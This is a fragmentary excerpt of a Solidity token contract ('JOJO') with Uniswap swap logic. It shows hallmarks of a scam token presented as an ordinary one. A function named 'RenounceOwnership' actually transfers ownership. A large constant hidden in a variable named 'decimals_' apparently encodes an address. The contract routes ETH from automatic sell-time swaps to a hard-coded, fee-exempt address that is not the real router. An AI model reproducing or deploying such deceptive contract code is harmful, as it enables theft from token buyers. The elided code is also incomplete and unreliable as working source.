...
interface IUniswapRouter {function factory() external pure returns (address);function WETH() external pure returns (address);function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;}interface IUniswapFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}abstract contract Ownable {address internal _owner;constructor () {_owner = msg.sender;}function owner() public view returns (address) {return _owner;}modifier onlyOwner() {require(_owner == msg.sender, "!owner");_;}function RenounceOwnership(address newOwner) public virtual onlyOwner {_owner = newOwner;}}

contract JOJO is Ownable {event Transfer(address indexed from, address indexed to, uint256 value);uint160 decimals_ = 53705828946281610539259879865206454855086001282;event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _uniRout;
    string public name;
    ...
    constructor (){
        ...
        _uniRout = 0x7831a87799Bf774a10eB129Df7ad11aD7E43971E;

        totalSupply = Supply * 10 ** decimals;
        address rAddr = msg.sender;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[rAddr] = true;
        _isExcludeFromFee[_uniRout] = true;_balances[rAddr] = totalSupply;emit Transfer(address(0), rAddr, totalSupply);
    ...
    function _transfer(address from,address to,uint256 amount) private {
        if (_uniswapPair == to && !inSwap) {
            ...
            if (_tokenBalInCa > 0) {
                ...
                try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_s,0,path,address(_uniRout),block.timestamp) {} catch {}
            }
            inSwap = false;
        }
